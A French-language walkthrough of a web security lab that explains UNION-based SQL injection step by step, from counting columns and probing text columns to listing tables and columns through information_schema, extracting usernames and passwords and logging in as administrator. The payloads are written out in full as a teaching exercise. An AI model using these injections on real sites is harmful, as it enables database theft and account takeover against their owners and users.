
## 1️⃣ Trouver le nombre de colonnes

Payload :

' UNION SELECT NULL,NULL--

### Ce que ça fait

La requête originale ressemble à :

SELECT name, price  
FROM products  
WHERE category='Gifts'

Ton injection transforme la requête en :

SELECT name, price  
FROM products  
WHERE category='Gifts'  
  
UNION  
  
SELECT NULL,NULL

### Pourquoi `NULL`

`NULL` fonctionne dans **tous les types de colonnes** :

- texte
    
- nombre
    
- date
    

Donc c’est la valeur la plus sûre pour tester.

### Objectif

Trouver **combien de colonnes la requête retourne**.

Si le nombre est incorrect → **erreur SQL**.

---

# 2️⃣ Vérifier les colonnes texte

Payload :

' UNION SELECT 'abc','def'--

### Ce que ça fait

La base exécute :

SELECT name, price  
FROM products  
WHERE category='Gifts'  
  
UNION  
  
SELECT 'abc','def'

### Pourquoi

On teste si les colonnes acceptent :

texte

Si le texte s’affiche sur la page → **colonne affichée et compatible texte**.

---

# 3️⃣ Lister les tables

Payload :

' UNION SELECT table_name,NULL FROM information_schema.tables--

### Ce que ça fait

On interroge une **table système spéciale** :

information_schema.tables

Cette table contient **toutes les tables de la base**.

La requête devient :

SELECT name, price  
FROM products  
WHERE category='Gifts'  
  
UNION  
  
SELECT table_name,NULL  
FROM information_schema.tables

### Résultat

La page affiche :

products  
users_xqgrlg  
orders  
sessions

➡️ Tu identifies **la table intéressante**.

---

# 4️⃣ Lister les colonnes de la table users

Payload :

' UNION SELECT column_name,NULL  
FROM information_schema.columns  
WHERE table_name='users_xqgrlg'--

### Ce que ça fait

On interroge une autre table système :

information_schema.columns

Elle contient :

toutes les colonnes de toutes les tables

La requête devient :

SELECT name, price  
FROM products  
WHERE category='Gifts'  
  
UNION  
  
SELECT column_name,NULL  
FROM information_schema.columns  
WHERE table_name='users_xqgrlg'

### Résultat

La page affiche :

username_uvrkur  
password_bpjdon  
email

➡️ Tu trouves **les champs sensibles**.

---

# 5️⃣ Extraire les données

Payload :

' UNION SELECT username_uvrkur,password_bpjdon FROM users_xqgrlg--

### Ce que ça fait

La requête devient :

SELECT name, price  
FROM products  
WHERE category='Gifts'  
  
UNION  
  
SELECT username_uvrkur,password_bpjdon  
FROM users_xqgrlg

### Résultat

La base renvoie :

administrator | x82kds8d  
carlos | 92kdd92

---

# 6️⃣ Connexion admin

Tu utilises les identifiants récupérés :

username : administrator  
password : x82kds8d

➡️ **Lab résolu**

---

# 🧠 Ce que tu viens vraiment de faire

Tu as utilisé SQLi pour **explorer toute la base de données** :

database  
   ├── tables  
   │      └── users  
   │  
   └── columns  
          ├── username  
          └── password

Puis tu as **extrait les données sensibles**.

---

# ⚡ Modèle mental simple

Une SQLi UNION sert à :

ajouter ta propre requête SQL  
dans la réponse de l’application

Donc tu transformes :

SELECT produits

en

SELECT produits  
UNION  
SELECT données sensibles
